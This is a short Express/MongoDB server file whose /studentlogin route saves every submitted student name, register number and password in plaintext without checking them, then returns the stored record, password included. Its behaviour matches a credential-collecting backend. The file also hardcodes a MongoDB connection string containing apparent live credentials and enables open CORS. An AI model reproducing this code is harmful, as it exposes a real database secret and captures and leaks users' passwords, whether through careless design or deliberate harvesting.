const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
require('dotenv').config();

app.use(bodyParser.json());
app.use(cors());

const Student = require('./models/student');

// ✅ MongoDB Connection
mongoose.connect("mongodb+srv://vithyflims:5d2rsQAxqHljuJfG@vcet-code.b6avj.mongodb.net/?retryWrites=true&w=majority&appName=vcet-code")
    .then(() => console.log("Connected to DB"))
    .catch(err => console.error("DB Connection Error:", err));

app.get('/', (req, res) => {
    res.send("Server is running on port 5000");
});

// ✅ Store all student login attempts
app.post('/studentlogin', async (req, res) => {
    const { name, registernumber, password } = req.body;

    try {
        // ✅ Always save the new student login attempt
        const newStudent = new Student({ name, registernumber, password });
        await newStudent.save();

        res.status(201).json({ message: "Student login stored successfully!", student: newStudent });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ message: "Server error", error });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
